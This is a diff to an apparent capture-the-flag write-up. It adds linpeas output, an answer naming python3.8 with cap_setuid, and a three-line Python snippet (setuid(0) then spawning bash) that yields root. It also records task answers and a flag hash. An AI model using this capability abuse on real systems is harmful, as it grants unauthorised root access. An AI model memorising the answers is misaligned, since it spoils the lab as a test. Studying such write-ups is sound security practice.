@@ -31,9 +31,7 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 ```
 Task 1: How many TCP ports are open?  
-Answer: <span style="background-color:#000000; color:#000000; padding:0 4px; border-radius:3px;">
-3{super_secret_answer}
-</span>
+Answer: 3 
 
 
 
@@ -72,5 +70,32 @@ We then view it and we get 244e99d298016ce460c3006b56e33bd7
 
 Task 7: Submit the flag located in the nathan user's home directory.
 Answer: 244e99d298016ce460c3006b56e33bd7
+
+
+To see what routes we have for privelege esclation we use linpeas. Using linpeas we see the following
+
+```
+Files with capabilities (limited to 50):                                                                                                                                                                                                    
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip                                                                                                                                                                                    
+/usr/bin/ping = cap_net_raw+ep                                                                                                                                                                                                              
+/usr/bin/traceroute6.iputils = cap_net_raw+ep                                                                                                                                                                                               
+/usr/bin/mtr-packet = cap_net_raw+ep                                                                                                                                                                                                        
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep  
+
+```
+ the main one we need to focus on is
+
+Task 8: What is the full path to the binary on this machine has special capabilities that can be abused to obtain root privileges?
+Answer: /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip  
+
+from here we utilise a simple python reverse shell being
+
+```
+import os
+os.setuid(0)
+os.system("/bin/bash")
+```
+
+using python3 in nathans terminal and using above code gives us root access. 
 
 
